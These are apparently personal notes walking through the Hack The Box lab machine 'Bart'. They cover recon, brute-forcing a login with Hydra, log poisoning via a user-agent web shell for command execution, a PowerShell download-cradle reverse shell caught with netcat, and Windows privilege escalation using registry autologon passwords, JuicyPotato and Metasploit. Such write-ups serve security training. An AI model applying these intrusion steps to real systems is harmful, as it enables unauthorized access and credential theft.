Hack the box - Bart

1. Run full Nmap scan - Port 80 open , service HTTP Microsoft IIS httpd 10.0

2. Google "windows IIS version to OS"  Found IIS 8.0 corresponds to windows 2012 (No useful info)

3. Run Gobuster / FFUF,  no proper output as expeted, results shows 200 for everything

4. So we CURL on the target with command "curl -vvv 10.10.10.80", we found redirect
URL with 302 response. we found [target]/forum

5. [target]/forum redirects to forum.bart.htb, so edit hostfile to 10.10.10.81 add the url

6. After editing hostfile, open forum.bart.htb and check in bottom it is mentioned as
wordpress.Search for wp-content, wp-plugin in view source. /wp-admin page also

7. Check comments in the source code - we find "harvy potter" in source code

8.In gobuster, we got [target]/moniter, redirects to bart.htb.monitor

9. Check forgot password to enumerate username, check with "harvey", alert message says
email is received

10. check harvey:potter credentials to login -> it is successful

11. Another link find after login -> internal-01.bart.htb

12. Here we need to use hydra brutforcer, "Harvey" with password not working (No csrf token in login page)

13. Run Hydra brute-force scan "http-post-form", add redirect to [target] and port 80 in burp
And run Hydra at target 127.0.0.1

14. Use the worlist "/commonroots.txt" from metasploit --> finally one of the password worked

15. Login with the password got from Hydra result. Check source code for a wurl with log.php directory

16. Add parameter ?filename=log&username=harvey , response body gives logged user-agent

17. So in burp, add user-agent with 1 line simple shell

18. add any parameter in request, ?filename=log&username=harvey&test=whoami , it gives results of current user

19. Now use Invoke-shell windows commands for file transfer and listen with netcat

20. add the parameter test=Powershell 'IE(New-object.....)', this invokes powershell and runs
command

20. We can get a shell, here we run JAWS (Just another windows enumberation script) in the shell we got
21. Run PowerUp.ps1, it is giving errors. Try running individual function from the script
still we are getting the error messages for 2 function for AuoAdminLogin register and Autologin password

22.Now we try registry redirector, it gives error that registry doesn't exist. 

23. Checking if the OS is 32 or 64 bit with command - [enviroment]::Is64BitOperatingSystem,

It returns True

[enviroment]::Is64BitProcess   // since it is 32 bit process
It returns false

24. Now we try to access "sysnative" folder - default in 64 bit OS , 32 bit process

25. Sysnative is not found via directory list command, May be it is hidden

26. Now add test=C:\Windows\SysNative\Windowspowershell\v1.0\Powershell 'IE(New-object.....)'

27. Still "Sysnative" is not found, so we move away from this process

28. Check "whoami /all" is shows privelage with "Impersonate a client after authentication"
Here we can run JuicyPotato exploit to get the previlages.


29. Get-RegistryAutoLogon , it displays administrator password

30. Goto FuzzySecurity github - Download PowerShell-Suite/InvokeRunAs.ps1

31. None of them works. So now use impact to login with SMB, make sure portforwarding is done

32. Use meterpreter exploit/windows/smb/smb delivery , but it is metasploit and involves a port 
forwarding
